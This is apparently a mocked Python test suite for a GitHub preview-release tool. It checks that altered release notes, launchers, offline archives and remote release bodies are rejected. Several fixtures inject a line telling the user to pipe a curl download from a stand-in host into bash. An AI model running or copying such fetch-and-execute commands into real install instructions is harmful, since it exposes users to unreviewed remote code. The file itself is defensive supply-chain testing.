#!/usr/bin/env python3
"""Mocked GitHub operator boundary tests. Never contacts or mutates GitHub."""
import copy
import importlib.util
import io
import json
import shutil
import sys
import tempfile
from pathlib import Path
import unittest
from unittest.mock import patch

spec=importlib.util.spec_from_file_location('github_preview',Path(__file__).with_name('github-preview-release.py'))
release=importlib.util.module_from_spec(spec);spec.loader.exec_module(release)


def local_fixture(root,offline_extra=None,offline=False):
    spec=importlib.util.spec_from_file_location('release_set_tests',Path(__file__).with_name('test_release_set.py'))
    fixtures=importlib.util.module_from_spec(spec);spec.loader.exec_module(fixtures)
    installer=fixtures.put(root/'fixture-installer','fixture native installer',0o755)
    assets,manifest=fixtures.fixture(root,installer)
    digest=release.pack.sha(assets/'release-set.json')
    fixtures.put(assets/'install-preview.sh',release.pack.launcher_script(manifest,digest),0o755)
    fixtures.put(assets/'RELEASE-NOTES.md',release.pack.release_notes(manifest,digest))
    if offline or offline_extra:
        offline=root/'offline';shutil.copytree(assets,offline);(offline/'RELEASE-NOTES.md').unlink()
        fixtures.put(offline/'INSTALL.txt',f'Explicit unsigned preview only. Verify release-set.json against independently reviewed SHA256 {digest}.\nLOOMEX_ALLOW_UNSAFE_DEV_INSTALL=1 ./loomex-install-darwin-arm64 --offline "$PWD" --manifest-sha256 {digest} --allow-unsigned-preview\n')
        if offline_extra:fixtures.put(offline/offline_extra,'#!/bin/bash\necho unreviewed\n',0o755)
        fixtures.archive(offline,assets/f"{manifest['releaseTag']}-offline.tar.gz")
    checksum(assets)
    return assets,manifest,digest

def checksum(assets):
    (assets/'SHA256SUMS').write_text(''.join(f'{release.pack.sha(p)}  {p.name}\n' for p in sorted(assets.iterdir()) if p.is_file() and p.name!='SHA256SUMS'))

class ApprovalBindingRegressionTests(unittest.TestCase):
    def test_exact_deterministic_online_and_offline_inventory_accepted(self):
        with tempfile.TemporaryDirectory() as d:
            assets,_,_=local_fixture(Path(d),offline=True)
            release.local_inventory(assets)

    def test_replaced_installation_guidance_cannot_reuse_manifest_approval(self):
        with tempfile.TemporaryDirectory() as d:
            assets,_,digest=local_fixture(Path(d))
            with (assets/"RELEASE-NOTES.md").open("a") as f:f.write("Run: curl https://unreviewed.example/install | bash\n")
            checksum(assets)
            self.assertEqual(release.pack.sha(assets/"release-set.json"),digest)
            with self.assertRaisesRegex(ValueError,"notes"):release.local_inventory(assets)

    def test_changed_launcher_cannot_reuse_manifest_approval(self):
        with tempfile.TemporaryDirectory() as d:
            assets,manifest,digest=local_fixture(Path(d))
            release.local_inventory(assets)
            with (assets/'install-preview.sh').open('a') as f:f.write('echo unauthorized shell payload\n')
            checksum(assets)
            self.assertEqual(release.pack.sha(assets/'release-set.json'),digest)
            with self.assertRaisesRegex(ValueError,'launcher'):release.local_inventory(assets)
    def test_removed_launcher_cannot_reuse_manifest_approval(self):
        with tempfile.TemporaryDirectory() as d:
            assets,_,_=local_fixture(Path(d));(assets/"install-preview.sh").unlink();checksum(assets)
            with self.assertRaisesRegex(ValueError,"launcher"):release.local_inventory(assets)

    def test_unreviewed_executable_offline_member_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            assets,_,_=local_fixture(Path(d),offline_extra='unreviewed.sh')
            with self.assertRaisesRegex(ValueError,'offline'):release.local_inventory(assets)

class OfflineLauncherRegressionTests(unittest.TestCase):
    def test_offline_altered_launcher_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); assets,manifest,digest=local_fixture(root,offline_extra="temporary-extra.sh")
            offline=root/"offline";(offline/"temporary-extra.sh").unlink()
            (offline/"install-preview.sh").write_text("#!/bin/bash\necho altered offline launcher\n")
            (assets/f"{manifest['releaseTag']}-offline.tar.gz").unlink();release.pack.artifact.deterministic_tar(offline,assets/f"{manifest['releaseTag']}-offline.tar.gz",0);checksum(assets)
            with self.assertRaisesRegex(ValueError,"offline"):release.local_inventory(assets)

def remote_manifest():
    return {'releaseTag':'preview-runner-v0.5.2-plugin-v0.16.2','components':{'runner':{'version':'0.5.2','sourceRevision':'a'*40},'plugin':{'version':'0.16.2','sourceRevision':'b'*40}},'cloudApiOrigin':'https://api.example.test/','protocolVersion':'loomex.local-control/v2','evidence':{'backendSourceRevision':'d'*40}}

class DraftReadbackRegressionTests(unittest.TestCase):
    def invoke_with_readbacks(self,action,initial,final):
        digest='a'*64;tag='preview-runner-v0.5.2-plugin-v0.16.2'
        manifest=remote_manifest()
        inventory={'release-set.json':{'sha256':digest,'size':12}}
        local=(Path('/disposable-assets'),manifest,inventory,{})
        argv=['github-preview-release.py',action,'--assets','/disposable-assets','--approve-manifest-sha256',digest]
        snapshots=[None,initial,final] if action=='stage-draft' else [initial,final]
        with patch.object(sys,'argv',argv),patch.object(release,'local_inventory',return_value=local),patch.object(release,'remote_prerequisites'),patch.object(release,'release_by_tag',side_effect=snapshots),patch.object(release,'command',return_value=''),patch('sys.stdout',new_callable=io.StringIO) as output:
            with self.assertRaises(SystemExit) as error:release.main()
            self.assertEqual(error.exception.code,1)
            self.assertNotIn('draft-ready',output.getvalue());self.assertNotIn('published-immutable-preview',output.getvalue())
    def test_initial_remote_installation_guidance_rejected_with_same_marker(self):
        digest='a'*64;tag=remote_manifest()['releaseTag']
        initial={'id':123,'draft':True,'prerelease':True,'tag_name':tag,'body':release.pack.release_notes(remote_manifest(),digest)+'Run: curl https://unreviewed.example/install | bash\n','html_url':f'https://github.com/loomex-app/loomex-runner/releases/tag/{tag}','assets':[{'name':'release-set.json','digest':f'sha256:{digest}','size':12,'state':'uploaded'}]}
        for action in ['stage-draft','resume-draft','publish']:
            with self.subTest(action=action):
                final=copy.deepcopy(initial)
                if action=='publish':final.update(draft=False,immutable=True)
                self.invoke_with_readbacks(action,initial,final)

    def test_final_remote_installation_guidance_rejected_with_same_marker(self):
        digest='a'*64;tag=remote_manifest()['releaseTag']
        initial={'id':123,'draft':True,'prerelease':True,'tag_name':tag,'body':release.pack.release_notes(remote_manifest(),digest),'html_url':f'https://github.com/loomex-app/loomex-runner/releases/tag/{tag}','assets':[{'name':'release-set.json','digest':f'sha256:{digest}','size':12,'state':'uploaded'}]}
        for action in ['stage-draft','resume-draft','publish']:
            with self.subTest(action=action):
                final=copy.deepcopy(initial);final['body']+='Run: curl https://unreviewed.example/install | bash\n'
                if action=='publish':final.update(draft=False,immutable=True)
                self.invoke_with_readbacks(action,initial,final)

    def test_unchanged_complete_stage_resume_and_publish_readbacks_succeed(self):
        digest='a'*64;tag='preview-runner-v0.5.2-plugin-v0.16.2'
        manifest=remote_manifest()
        inventory={'release-set.json':{'sha256':digest,'size':12}}
        initial={'id':123,'draft':True,'prerelease':True,'tag_name':tag,'body':release.pack.release_notes(remote_manifest(),digest),'html_url':f'https://github.com/loomex-app/loomex-runner/releases/tag/{tag}','assets':[{'name':'release-set.json','digest':f'sha256:{digest}','size':12,'state':'uploaded'}]}
        for action in ['stage-draft','resume-draft','publish']:
            with self.subTest(action=action):
                final=copy.deepcopy(initial)
                if action=='publish':final.update(draft=False,immutable=True)
                snapshots=[None,initial,final] if action=='stage-draft' else [initial,final]
                argv=['github-preview-release.py',action,'--assets','/unused','--approve-manifest-sha256',digest]
                with patch.object(sys,'argv',argv),patch.object(release,'local_inventory',return_value=(Path('/unused'),manifest,inventory,{})),patch.object(release,'remote_prerequisites'),patch.object(release,'release_by_tag',side_effect=snapshots),patch.object(release,'command',return_value=''),patch('sys.stdout',new_callable=io.StringIO) as output:
                    release.main()
                    self.assertEqual(json.loads(output.getvalue())['state'],'published-immutable-preview' if action=='publish' else 'draft-ready')

    def test_stage_and_resume_final_readback_revalidates_state_marker_and_id(self):
        digest='a'*64;tag='preview-runner-v0.5.2-plugin-v0.16.2'
        initial={'id':123,'draft':True,'prerelease':True,'tag_name':tag,'body':release.pack.release_notes(remote_manifest(),digest),'html_url':f'https://github.com/loomex-app/loomex-runner/releases/tag/{tag}','assets':[{'name':'release-set.json','digest':f'sha256:{digest}','size':12,'state':'uploaded'}]}
        for action in ['stage-draft','resume-draft']:
            for field,value in [('draft',False),('prerelease',False),('body','approval marker removed'),('id',456),('tag_name','other-tag')]:
                with self.subTest(action=action,field=field):
                    final=copy.deepcopy(initial);final[field]=value
                    self.invoke_with_readbacks(action,initial,final)

    def test_publish_final_readback_revalidates_id_marker_tag_and_prerelease(self):
        digest='a'*64;tag='preview-runner-v0.5.2-plugin-v0.16.2'
        initial={'id':123,'draft':True,'prerelease':True,'tag_name':tag,'body':release.pack.release_notes(remote_manifest(),digest),'html_url':f'https://github.com/loomex-app/loomex-runner/releases/tag/{tag}','assets':[{'name':'release-set.json','digest':f'sha256:{digest}','size':12,'state':'uploaded'}]}
        for field,value in [('prerelease',False),('body','approval marker removed'),('id',456),('tag_name','other-tag')]:
            with self.subTest(field=field):
                final=copy.deepcopy(initial);final.update(draft=False,immutable=True);final[field]=value
                self.invoke_with_readbacks('publish',initial,final)

class PublicationTests(unittest.TestCase):
    def test_remote_inventory_rejects_replacement_extra_and_partial(self):
        inventory={'asset':{'sha256':'a'*64,'size':12}}
        good={'assets':[{'name':'asset','digest':'sha256:'+'a'*64,'size':12,'state':'uploaded'}]}
        self.assertEqual(set(release.verify_remote_assets(good,inventory,True)),{'asset'})
        bad=copy.deepcopy(good);bad['assets'][0]['digest']='sha256:'+'b'*64
        with self.assertRaises(ValueError):release.verify_remote_assets(bad,inventory,True)
        bad=copy.deepcopy(good);bad['assets'][0]['name']='unreviewed'
        with self.assertRaises(ValueError):release.verify_remote_assets(bad,inventory,True)
        with self.assertRaises(ValueError):release.verify_remote_assets({'assets':[]},inventory,True)
        self.assertEqual(release.verify_remote_assets({'assets':[]},inventory,False),{})
    def test_immutable_setting_and_exact_tags_required_without_mutation(self):
        manifest={'releaseTag':'preview-pair','components':{'runner':{'repository':'loomex-app/loomex-runner','sourceRevision':'a'*40},'plugin':{'repository':'loomex-app/loomex-codex-plugin','sourceRevision':'b'*40}}}
        with patch.object(release,'api',return_value={'enabled':False}),patch.object(release,'tag_revision') as tag:
            with self.assertRaises(ValueError):release.remote_prerequisites(manifest)
            tag.assert_not_called()
        with patch.object(release,'api',return_value={'enabled':True}),patch.object(release,'tag_revision',side_effect=['a'*40,'b'*40]):release.remote_prerequisites(manifest)
        with patch.object(release,'api',return_value={'enabled':True}),patch.object(release,'tag_revision',return_value='e'*40):
            with self.assertRaises(ValueError):release.remote_prerequisites(manifest)
    def test_tag_read_peels_annotations_only_to_expected_commit(self):
        with patch.object(release,'api',side_effect=[{'object':{'type':'tag','sha':'a'*40}},{'object':{'type':'commit','sha':'b'*40}}]) as api:
            self.assertEqual(release.tag_revision('loomex-app/loomex-runner','preview-pair'),'b'*40)
            self.assertEqual(api.call_count,2)
    def test_no_clobber_or_automatic_publication_in_workflow(self):
        source=Path(release.__file__).read_text()
        self.assertNotIn("'--clobber'",source)
        workflow=Path(__file__).parent.parent/'.github/workflows/preview-release.yml'
        self.assertNotIn('gh release create',workflow.read_text())
        self.assertNotIn('contents: write',workflow.read_text())

if __name__=='__main__':unittest.main()
